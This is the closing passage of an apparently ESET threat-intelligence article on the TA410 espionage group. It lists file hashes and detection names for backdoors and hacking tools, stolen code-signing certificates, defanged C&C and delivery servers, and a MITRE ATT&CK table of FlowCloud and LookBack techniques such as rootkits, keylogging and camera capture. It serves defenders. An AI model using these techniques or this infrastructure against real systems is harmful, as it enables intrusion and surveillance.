<td>Win32/Agent.UJN</td>
<td>Simple cmd.exe-based backdoor compiled with MingW.</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">2B61E7C63A0A33AAC4CF7FE0CEB462CF6DACC080</span></td>
<td><span style="font-family: courier new, courier, monospace;">htran.exe</span></td>
<td>Win32/HackTool.Hucline.AB</td>
<td>HUC Packet Transmitter (HTran).</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">EF3C796652141B8A68DCCF488159E96903479C29</span></td>
<td><span style="font-family: courier new, courier, monospace;">htran_f-secury.exe</span></td>
<td>Win32/HackTool.Hucline.AB</td>
<td>HUC Packet Transmitter (HTran).</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">6B547C244A3086B5B6EA2B3A0D9594BBE54AE06B</span></td>
<td><span style="font-family: courier new, courier, monospace;">inbt.zip</span></td>
<td>Python/HackTool.Agent.J</td>
<td>EXE masquerading as ZIP. This is a Python network scanner (compiled with PyInstaller).</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">4CDCE3AF614C2A5E60E71F1205812AB129C0955B</span></td>
<td><span style="font-family: courier new, courier, monospace;">msd017.exe</span></td>
<td>Python/Exploit.MS17-010.B</td>
<td>This is a Python scanner (compiled with PyInstaller) for the vulnerability MS17-010 (EternalBlue).</td>
</tr>
</tbody>
</table></p>
<h3>Certificates</h3>
<p><table>
<thead>
<tr>
<th><strong>Serial number </strong></th>
<th><span style="font-family: courier new, courier, monospace;">0F8B600FF1882E</span></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Thumbprint</strong></td>
<td><span style="font-family: courier new, courier, monospace;">02ED6A578C575C8D9C72398E790354B095BB07BC</span></td>
</tr>
<tr>
<td><strong>Subject CN</strong></td>
<td>Hangzhou Leishite Laser Technology Co., Ltd.</td>
</tr>
<tr>
<td><strong>Subject O</strong></td>
<td>Hangzhou Leishite Laser Technology Co., Ltd.</td>
</tr>
<tr>
<td><strong>Subject L</strong></td>
<td>Hangzhou</td>
</tr>
<tr>
<td><strong>Subject S</strong></td>
<td>Zhejiang</td>
</tr>
<tr>
<td><strong>Subject C</strong></td>
<td>CN</td>
</tr>
<tr>
<td><strong>Valid from</strong></td>
<td>2012-03-29 09:07:04 UTC</td>
</tr>
<tr>
<td><strong>Valid to</strong></td>
<td>2014-04-02 06:24:19 UTC</td>
</tr>
</tbody>
</table></p>
<p><table>
<thead>
<tr>
<th><strong>Serial number </strong></th>
<th><span style="font-family: courier new, courier, monospace;">4ED8730F4E1B8558CD1CB0107B5F776B</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Thumbprint</strong></td>
<td><span style="font-family: courier new, courier, monospace;">850821D88A4475F0310F10FBA806353A4113D252</td>
</tr>
<tr>
<td><strong>Subject CN</strong></td>
<td>北京和 赢讯时 科技有限公司   (translation: Beijing    Heyingxunshi Technology Co., Ltd.)</td>
</tr>
<tr>
<td><strong>Subject O</strong></td>
<td>北京和 赢讯时 科技有限公司   (translation: Beijing Heyingxunshi Technology Co., Ltd.)</td>
</tr>
<tr>
<td><strong>Subject OU</strong></td>
<td>研 发 部  ( R&D Department)</td>
</tr>
<tr>
<td><strong>Subject S</strong></td>
<td>北京市  (Beijing)</td>
</tr>
<tr>
<td><strong>Subject C</strong></td>
<td>CN</td>
</tr>
<tr>
<td><strong>Valid from</strong></td>
<td>2019-11-13 00:00:00 UTC</td>
</tr>
<tr>
<td><strong>Valid to</strong></td>
<td>2020-11-12 23:59:59 UTC</td>
</tr>
</tbody>
</table></p>
<h3>Network</h3>
<p><table>
<thead>
<tr>
<th>Domain</th>
<th>IP</th>
<th>First seen</th>
<th>Details</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">43.254.216[.]104</span></td>
<td>2020-06</td>
<td>Delivery server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">45.124.115[.]103</span></td>
<td>2020-08</td>
<td>Delivery server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">161.82.181[.]4</span></td>
<td>2020-12</td>
<td>Delivery server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">43.254.219[.]153</span></td>
<td>2020-07</td>
<td>X4 C&C server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">154.223.141[.]36</span></td>
<td>2020-06</td>
<td>HTran C&C server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">103.139.2[.]93</span></td>
<td>2020-10</td>
<td>Tendyron C&C server</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">cahe.microsofts[.]com</span></td>
<td></td>
<td></td>
<td>QuasarRAT C&C server</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">ffca.caibi379[.]com</span></td>
<td></td>
<td></td>
<td>QuasarRAT downloader C&C server</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">smtp.nsfwgo[.]com</span></td>
<td></td>
<td></td>
<td>Korplug C&C server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">45.124.115[.]103</span></td>
<td>2020-06</td>
<td>LookBack C&C server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">185.225.19[.]17</span></td>
<td>2021-01</td>
<td>LookBack C&C server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">94.158.245[.]249</span></td>
<td>2020-03</td>
<td>LookBack C&C server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">5.252.179[.]227</span></td>
<td>2021-03</td>
<td>LookBack C&C server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">222.186.151[.]141</span></td>
<td>2019-11</td>
<td>FlowCloud C&C server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">47.111.22[.]65</span></td>
<td>2020-09</td>
<td>FlowCross C&C server</td>
</tr>
<tr>
<td></td>
<td><span style="font-family: courier new, courier, monospace;">114.55.109[.]199</span></td>
<td>2020-05</td>
<td>FlowCloud C&C server</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">dlaxpcmghd[.]com</span></td>
<td><span style="font-family: courier new, courier, monospace;">185.225.17[.]39</span></td>
<td>2020-09</td>
<td>LookBack C&C server</td>
</tr>
<tr>
<td><span style="font-family: courier new, courier, monospace;">wwww.dlmum[.]com</span></td>
<td></td>
<td>N/A</td>
<td>FlowCloud C&C server</td>
</tr>
</tbody>
</table></p>
<h2>MITRE ATT&amp;CK techniques</h2>
<p>This table was built using <a href="https://attack.mitre.org/resources/versions/"><em>version 9</em></a> of the MITRE ATT&amp;CK framework.</p>
<p><table>
<thead>
<tr>
<th>Tactic</th>
<th>ID</th>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td rowspan="3">Resource Development</td>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1587/001/" rel="noopener" target="_blank">T1587.001</a></td>
<td>Develop Capabilities: Malware</td>
<td>TA410 develops LookBack and FlowCloud.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1588/003" rel="noopener" target="_blank">T1588.003</a></td>
<td>Obtain Capabilities: Code Signing Certificates</td>
<td>TA410 uses stolen code-signing certificates.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1588/005/" rel="noopener" target="_blank">T1588.005</a></td>
<td>Obtain Capabilities: Exploits</td>
<td>TA410 had exploits for ProxyLogon and ProxyShell.</td>
</tr>
<tr>
<td rowspan="2">Initial Access</td>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1190/" rel="noopener" target="_blank">T1190</a></td>
<td>Exploit Public-Facing Application</td>
<td>TA410 has exploited web server vulnerabilities for initial access.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1566/001/" rel="noopener" target="_blank">T1566.001</a></td>
<td>Phishing: Spearphishing Attachment</td>
<td>TA410 uses malicious RTF and DOCX attachments to compromise victims.</td>
</tr>
<tr>
<td rowspan="5">Execution</td>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1106/" rel="noopener" target="_blank">T1106</a></td>
<td>Native API</td>
<td>FlowCloud makes extensive use of the Windows API to execute commands and launch processes.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1129/" rel="noopener" target="_blank">T1129</a></td>
<td>Shared Modules</td>
<td>TA410’s backdoors can load DLLs and execute their payloads.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1203/" rel="noopener" target="_blank">T1203</a></td>
<td>Exploitation for Client Execution</td>
<td>TA410 uses Royal Road RTF documents to compromise victims.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1559/001/" rel="noopener" target="_blank">T1559.001</a></td>
<td>Inter-Process Communication: Component Object Model</td>
<td>FlowCloud uses COM interfaces to schedule tasks and perform WMI queries.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1047" rel="noopener" target="_blank">T1047</a></td>
<td>Windows Management Instrumentation</td>
<td>TA410 uses WMI for lateral movement and information gathering.</td>
</tr>
<tr>
<td rowspan="3">Persistence</td>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1053/005/" rel="noopener" target="_blank">T1053.005</a></td>
<td>Scheduled Task/Job: Scheduled Task</td>
<td>FlowCloud creates a scheduled task for persistence.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1505/003/" rel="noopener" target="_blank">T1505.003</a></td>
<td>Server Software Component: Web Shell</td>
<td>TA410 plants webshells on vulnerable web servers.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1543/003/" rel="noopener" target="_blank">T1543.003</a></td>
<td>Create or Modify System Process: Windows Service</td>
<td>FlowCloud can be configured to create a service for persistence.</td>
</tr>
<tr>
<td rowspan="14">Defense Evasion</td>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1027/" rel="noopener" target="_blank">T1027</a></td>
<td>Obfuscated Files or Information</td>
<td>FlowCloud files are distributed and stored in encrypted form.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1036/004/" rel="noopener" target="_blank">T1036.004</a></td>
<td>Masquerading: Masquerade Task or Service</td>
<td>The driver component of FlowCloud masquerades as a mouse driver service.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1036/005/" rel="noopener" target="_blank">T1036.005</a></td>
<td>Masquerading: Match Legitimate Name or Location</td>
<td>Files named after legitimate utilities are written into the <span style="font-family: courier new, courier, monospace;">%ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\</span> subdirectory.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1014/" rel="noopener" target="_blank">T1014</a></td>
<td>Rootkit</td>
<td>FlowCloud uses a rootkit to hide its network traffic and processes from system utilities.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1055.001/" rel="noopener" target="_blank">T1055.001</a></td>
<td>Process Injection: Dynamic-link Library Injection</td>
<td>FlowCloud uses both regular and reflective DLL injection. It also manually loads some DLLs, bypassing calls to <span style="font-family: courier new, courier, monospace;">LoadLibrary</span>.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1055/" rel="noopener" target="_blank">T1055</a></td>
<td>Process Injection</td>
<td>TA410’s backdoors perform process injection to masquerade as harmless processes.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1055/003/" rel="noopener" target="_blank">T1055.003</a></td>
<td>Process Injection: Thread Execution Hijacking</td>
<td>One of FlowCloud’s DLLs replaces instructions in the loading process to make it execute code written in its memory.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1055/012/" rel="noopener" target="_blank">T1055.012</a></td>
<td>Process Injection: Process Hollowing</td>
<td>FlowCloud uses module stomping to hide the loading of its main backdoor.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1140/" rel="noopener" target="_blank">T1140</a></td>
<td>Deobfuscate/Decode Files or Information</td>
<td>Multiple TA410 backdoors communicate with their C&C through encrypted and obfuscated channels.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1574/002/" rel="noopener" target="_blank">T1574.002</a></td>
<td>Hijack Execution Flow: DLL Side-Loading</td>
<td>FlowCloud uses DLL Side-Loading to launch its second-stage dropper.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1497/" rel="noopener" target="_blank">T1497</a></td>
<td>Virtualization/Sandbox Evasion</td>
<td>Some versions of FlowCloud use the Pafish utility to detect virtualization, sandboxes, and debuggers.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1134/002/" rel="noopener" target="_blank">T1134.002</a></td>
<td>Access Token Manipulation: Create Process with Token</td>
<td>FlowCloud can create processes using tokens acquired from legitimate processes.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1070/004" rel="noopener" target="_blank">T1070.004</a></td>
<td>Indicator Removal on Host: File Deletion</td>
<td>FlowCloud deletes its rootkit’s executable after launching it.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1070.006/" rel="noopener" target="_blank">T1070.006</a></td>
<td>Indicator Removal on Host: Timestomp</td>
<td>FlowCloud backdates some files and services to 2013.</td>
</tr>
<tr>
<td rowspan="8">Discovery</td>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1010/" rel="noopener" target="_blank">T1010</a></td>
<td>Application Window Discovery</td>
<td>When logging mouse events, FlowCloud gathers information about the application running in the foreground.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1057/" rel="noopener" target="_blank">T1057</a></td>
<td>Process Discovery</td>
<td>Multiple TA410 backdoors can list running processes.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1518" rel="noopener" target="_blank">T1518</a></td>
<td>Software Discovery</td>
<td>FlowCloud uses the <span style="font-family: courier new, courier, monospace;">IShellAppManager</span> COM object to list installed software.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1083/" rel="noopener" target="_blank">T1083</a></td>
<td>File and Directory Discovery</td>
<td>FlowCloud can search through connected file systems and obtain directory listings.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1120/" rel="noopener" target="_blank">T1120</a></td>
<td>Peripheral Device Discovery</td>
<td>FlowCloud can list connected camera devices.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1016/" rel="noopener" target="_blank">T1016</a></td>
<td>System Network Configuration Discovery</td>
<td>FlowCloud can discover and use locally configured proxies.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1012/" rel="noopener" target="_blank">T1012</a></td>
<td>Query Registry</td>
<td>FlowCloud components use registry keys to signal each other.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1115/" rel="noopener" target="_blank">T1115</a></td>
<td>Clipboard Data</td>
<td>FlowCloud registers a listener to steal clipboard data when it is changed.</td>
</tr>
<tr>
<td rowspan="11">Collection</td>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1056" rel="noopener" target="_blank">T1056</a></td>
<td>Input Capture</td>
<td>FlowCloud logs mouse clicks.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1056/001" rel="noopener" target="_blank">T1056.001</a></td>
<td>Input Capture: Keylogging</td>
<td>FlowCloud records keystrokes.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1113" rel="noopener" target="_blank">T1113</a></td>
<td>Screen Capture</td>
<td>FlowCloud takes screenshots at regular intervals.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1125" rel="noopener" target="_blank">T1125</a></td>
<td>Video Capture</td>
<td>FlowCloud uses OpenCV to take pictures using connected camera devices.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1123" rel="noopener" target="_blank">T1123</a></td>
<td>Audio Capture</td>
<td>FlowCloud has audio capture functionality.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1119/" rel="noopener" target="_blank">T1119 </a></td>
<td>Automated Collection</td>
<td>FlowCloud automatically collects data based on timers and events.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1074/001/" rel="noopener" target="_blank">T1074.001</a></td>
<td>Data Staged: Local Data Staging</td>
<td>FlowCloud stores collected data in local SQLite databases prior to exfiltration.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1005/" rel="noopener" target="_blank">T1005</a></td>
<td>Data from Local System</td>
<td>FlowCloud can exfiltrate files from local file systems.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1025/" rel="noopener" target="_blank">T1025</a></td>
<td>Data from Removable Media</td>
<td>FlowCloud can exfiltrate files from removable drives.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1560/002/" rel="noopener" target="_blank">T1560.002</a></td>
<td>Archive Collected Data: Archive via Library</td>
<td>FlowCloud and LookBack use a statically linked zlib library to compress data.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1560/003/" rel="noopener" target="_blank">T1560.003</a></td>
<td>Archive Collected Data: Archive via Custom Method</td>
<td>FlowCloud compresses some collected data by removing duplicates and similar screen captures.</td>
</tr>
<tr>
<td rowspan="5">Command And Control</td>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1071/001/" rel="noopener" target="_blank">T1071.001</a></td>
<td>Application Layer Protocol: Web Protocols</td>
<td>LookBack and FlowCloud can send and receive data over HTTP.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1095/" rel="noopener" target="_blank">T1095</a></td>
<td>Non-Application Layer Protocol</td>
<td>LookBack can communicate over raw TCP sockets.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1132/001" rel="noopener" target="_blank">T1132.001</a></td>
<td>Data Encoding: Standard Encoding</td>
<td>FlowCloud uses Protobuf to encode C&C commands and configuration.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1132/002" rel="noopener" target="_blank">T1132.002</a></td>
<td>Data Encoding: Non-Standard Encoding</td>
<td>LookBack encodes binary data using a custom hex-encoding method.</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1573/001/" rel="noopener" target="_blank">T1573.001</a></td>
<td>Encrypted Channel: Symmetric Cryptography</td>
<td>FlowCloud can use XOR, TEA, RC4 and a modified AES algorithm to encrypt traffic and files.</td>
</tr>
<tr>
<td>Exfiltration</td>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1030/" rel="noopener" target="_blank">T1030</a></td>
<td>Data Transfer Size Limits</td>
<td>FlowCloud uses local caches to stage data and exfiltrates their content when it reaches a size specified in its configuration.</td>
</tr>
<tr>
<td>Impact</td>
<td><a href="https://attack.mitre.org/versions/v9/techniques/T1529/" rel="noopener" target="_blank">T1529</a></td>
<td>System Shutdown/Reboot</td>
<td>FlowCloud can force a system crash or shutdown. </td>
</tr>
</tbody>
</table></p>
<p><a class="no-fancy" href="https://www.eset.com/int/business/services/threat-intelligence/?utm_source=welivesecurity.com&amp;utm_medium=referral&amp;utm_campaign=wls-research&amp;utm_content=lookback-ta410-umbrella-cyberespionage-ttps-activity" target="_blank" rel="noopener"><img class="aligncenter wp-image-152551" src="https://web-assets.esetstatic.com/wls/2021/07/bandook-bandidos-eti-cta.png" alt="" width="899" height="290" /></a></p>
</div>                
                <div class="article-subscribe-form mb-4">
                    <hr />
                    <div class="form-wrapper">
  <div class="overlay">
    <h2 class="title">
      Let us keep you <br class='d-md-none'>up to date
    </h2>
    <p class="subtitle">
      Sign up for our newsletters
    </p>
    <div class="form">
        <form action="https://enjoy.eset.com/pub/rf" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter px-0" target="_blank" method="post" role="search">
            <div class="search-input clearfix">
                <input type="text" name="EMAIL_ADDRESS_" value="" placeholder="Your Email Address" required>
                    <input type="checkbox" id="TOPIC" name="TOPIC" value="We Live Security Ukraine Newsletter">
                    <label for="TOPIC">Ukraine Crisis newsletter</label>
                    <input type="checkbox" id="NEWSLETTER" name="NEWSLETTER" value="We Live Security">
                    <label for="NEWSLETTER">Regular weekly newsletter</label>
                    <input type="hidden" name="_ri_" value="X0Gzc2X%3DAQpglLjHJlTQGgXv4jDGEK4KW2uhw0qgUzfwuivmOJOPCgzgo9vsI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DAQpglLjHJlTQGzbD6yU2pAgzaJM16bkTA7tOwuivmOJOPCgzgo9vsI3">
                    <input type="hidden" name="_ei_" value="Ep2VKa8UKNIAPP_2GAEW0bY">
                    <input type="hidden" name="_di_" value="m0a5n0j02duo9clmm4btuu5av8rdtvqfqd03v1hallrvcob47ad0">
                    <input type="hidden" name="EMAIL_PERMISSION_STATUS_" value="0">
                    <input type="hidden" name="CONTACT_SOURCE_MOST_RECENT" value="WLS_Subscribe_Form">
                <button type="submit" class="redirect-button primary">Subscribe</button>
            </div>
        </form>
    </div>
  </div>
  <svg class="wave-overlay" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 201.7451"><g><path class="cls-1" d="m600,0v176.576c0,13.8934-11.2757,25.1691-25.1691,25.1691H25.1691c-13.9034,0-25.1691-11.2757-25.1691-25.1691v-110.6331c36.0722,38.8207,82.2223,71.8325,145.2255,88.6052.0402,0,.0805.0101.1107.0301,0,0,.0906,0,.1107.0302,108.7605,28.9444,198.3321-8.95,271.9366-49.865l29.5585-16.9537L600,0Z" /></g></svg></div>                </div>

                                    <div class="d-block">
                        <div class="post-related-articles">
        <h4 class="articles-title-divider py-4 my-2">
            Related Articles
        </h4>
            <div class="articles-card-grid row g-0 pb-2 pb-md-3"><div class="col-12 col-sm-12 col-md-6 col-lg-4 article"><div class="card-divider"><hr class="articles-card-divider px-0 m-0" /></div><div class="article-card"><a href="/en/eset-research/toolshell-an-all-you-can-eat-buffet-for-threat-actors/" title="ToolShell: An all-you-can-eat buffet for threat actors"><div class="row g-0 row-cols-1"><div class="article-list-card-header col"><div class="row g-0"><div class="col-9 d-md-none pe-3"><div class="article-list-card-title"><div class="article-tags mb-1 dark small"><p class="article-tag text-capitalize">ESET Research</p></div><p class="title">ToolShell: An all-you-can-eat buffet for threat actors</p></div></div><div class="col-3 col-md-12"><picture><source srcset="https://web-assets.esetstatic.com/tn/-x82/wls/2025/07-25/toolshell/toolshell-vulnerability-exploitation-research-eset.jpeg" media="(max-width: 768px)" /><img class="article-list-image small-card mt-1 mt-md-0 w-100"  src="https://web-assets.esetstatic.com/tn/-x145/wls/2025/07-25/toolshell/toolshell-vulnerability-exploitation-research-eset.jpeg" alt="ToolShell: An all-you-can-eat buffet for threat actors" loading="lazy" /></picture></div></div></div><div class="article-list-card-body col ps-0"><div class="d-none d-md-block pb-1"><div class="article-list-card-title"><div class="article-tags mb-1 dark small"><p class="article-tag text-capitalize">ESET Research</p></div><p class="title">ToolShell: An all-you-can-eat buffet for threat actors</p></div></div><div><div class="article-title-info"><p><b></b></p></div></div></div></div></a></div></div><div class="col-12 col-sm-12 col-md-6 col-lg-4 article"><div class="card-divider"><hr class="articles-card-divider px-0 m-0" /></div><div class="article-card"><a href="/en/eset-research/unmasking-asyncrat-navigating-labyrinth-forks/" title="Unmasking AsyncRAT: Navigating the labyrinth of forks"><div class="row g-0 row-cols-1"><div class="article-list-card-header col"><div class="row g-0"><div class="col-9 d-md-none pe-3"><div class="article-list-card-title"><div class="article-tags mb-1 dark small"><p class="article-tag text-capitalize">ESET Research</p></div><p class="title">Unmasking AsyncRAT: Navigating the labyrinth of forks</p></div></div><div class="col-3 col-md-12"><picture><source srcset="https://web-assets.esetstatic.com/tn/-x82/wls/2025/07-25/asyncrat/asyncrat-eset-research.jpeg" media="(max-width: 768px)" /><img class="article-list-image small-card mt-1 mt-md-0 w-100"  src="https://web-assets.esetstatic.com/tn/-x145/wls/2025/07-25/asyncrat/asyncrat-eset-research.jpeg" alt="Unmasking AsyncRAT: Navigating the labyrinth of forks" loading="lazy" /></picture></div></div></div><div class="article-list-card-body col ps-0"><div class="d-none d-md-block pb-1"><div class="article-list-card-title"><div class="article-tags mb-1 dark small"><p class="article-tag text-capitalize">ESET Research</p></div><p class="title">Unmasking AsyncRAT: Navigating the labyrinth of forks</p></div></div><div><div class="article-title-info"><p><b></b></p></div></div></div></div></a></div></div><div class="col-12 col-sm-12 col-md-6 col-lg-4 article"><div class="card-divider"><hr class="articles-card-divider px-0 m-0" /></div><div class="article-card"><a href="/en/eset-research/gamaredon-2024-cranking-out-spearphishing-campaigns-ukraine-evolved-toolset/" title="Gamaredon in 2024: Cranking out spearphishing campaigns against Ukraine with an evolved toolset"><div class="row g-0 row-cols-1"><div class="article-list-card-header col"><div class="row g-0"><div class="col-9 d-md-none pe-3"><div class="article-list-card-title"><div class="article-tags mb-1 dark small"><p class="article-tag text-capitalize">ESET Research</p></div><p class="title">Gamaredon in 2024: Cranking out spearphishing campaigns against Ukraine with an evolved toolset</p></div></div><div class="col-3 col-md-12"><picture><source srcset="https://web-assets.esetstatic.com/tn/-x82/wls/2025/06-25/research-eset-gamaredon-spearphishing-ukraine.png" media="(max-width: 768px)" /><img class="article-list-image small-card mt-1 mt-md-0 w-100"  src="https://web-assets.esetstatic.com/tn/-x145/wls/2025/06-25/research-eset-gamaredon-spearphishing-ukraine.png" alt="Gamaredon in 2024: Cranking out spearphishing campaigns against Ukraine with an evolved toolset" loading="lazy" /></picture></div></div></div><div class="article-list-card-body col ps-0"><div class="d-none d-md-block pb-1"><div class="article-list-card-title"><div class="article-tags mb-1 dark small"><p class="article-tag text-capitalize">ESET Research</p></div><p class="title">Gamaredon in 2024: Cranking out spearphishing campaigns against Ukraine with an evolved toolset</p></div></div><div><div class="article-title-info"><p><b></b></p></div></div></div></div></a></div></div></div></div>                    </div>
                            </div>
            <div id="article-page-sidebar" class="sidebar col col-lg-4 ps-5 d-none d-lg-block position-sticky">
                                    <div class="sidebar-section--table-of-contents">
                        <div class="sticky-top sticky-top--container">
                            <nav class="table-of-contents" data-controller="toggle">
        <h2 class="table-of-contents__title">
            Table of Contents
        </h2>
</nav>
                        </div>
                    </div>
                    <div class="sidebar-section--banner">
                        <div class="sticky-top sticky-top--container">
                                                                                                <a class="d-block sidebar-card-banner" href="https://www.eset.com/us/business/services/threat-intelligence/" title="ESET Threat Intelligence" target="_blank">
    <img src="https://www.welivesecurity.com/build/assets/eset-threat-intelligence-d0944f00.webp" alt="ESET Threat Intelligence" class="w-100" >
</a>                                                                                    </div>
                    </div>
                    <div class="sidebar-section--similar-articles">
                        <div class="sticky-top sticky-top--container">
                                                                                                                    <div class="pb-4">
                                <div class="share-article-card">
                                    <div class="sidebar-card-media">
    <div class="mb-3">
        <h3 class="articles-title-divider">Share Article</h3>    </div>
    <div class="medias">
        <a href="https://www.facebook.com/sharer/sharer.php?u&#x3D;https://www.welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/" title="Facebook" >
            <svg id="Layer_2" fill="#949ca1" class="facebook" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewBox="0 0 50 50"><g id="Layer_2-2"><circle cx="25" cy="25" r="25" /><path fill="white"d="m30.9623,26.8125l.8054-5.2483h-5.0359v-3.4058c0-1.4358.7035-2.8354,2.9589-2.8354h2.2894v-4.4684s-2.0776-.3546-4.064-.3546c-4.1472,0-6.858,2.5137-6.858,7.0642v4h-4.61v5.2483h4.61v12.6875h5.6737v-12.6875h4.2305Z" /></g></svg>        </a>
        <a href="https://www.linkedin.com/shareArticle?mini&#x3D;true&amp;url&#x3D;https://www.welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/" title="LinkedIn" >
            <svg id="Layer_2" fill="#949ca1" class="linkedin" xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewBox="0 0 50 50"><g id="Layer_2-2"><circle cx="25" cy="25" r="25" /><path fill="white"d="m18.7686,35.9995h-4.9757v-16.0232h4.9757v16.0232Zm-2.4905-18.2089c-1.5911,0-2.8816-1.3179-2.8816-2.9089.0002-1.5915,1.2906-2.8814,2.882-2.8812,1.5911.0002,2.881,1.29,2.8812,2.8812,0,1.5911-1.2911,2.9089-2.8816,2.9089Zm21.113,18.2089h-4.965v-7.8c0-1.8589-.0375-4.2429-2.587-4.2429-2.587,0-2.9834,2.0196-2.9834,4.1089v7.9339h-4.9704v-16.0232h4.7721v2.1857h.0696c.6643-1.2589,2.287-2.5875,4.7079-2.5875,5.0357,0,5.9614,3.3161,5.9614,7.6232v8.8018h-.0054Z" /></g></svg>        </a>
        <a href="https://twitter.com/intent/tweet?url&#x3D;https://www.welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/" title="Twitter" >
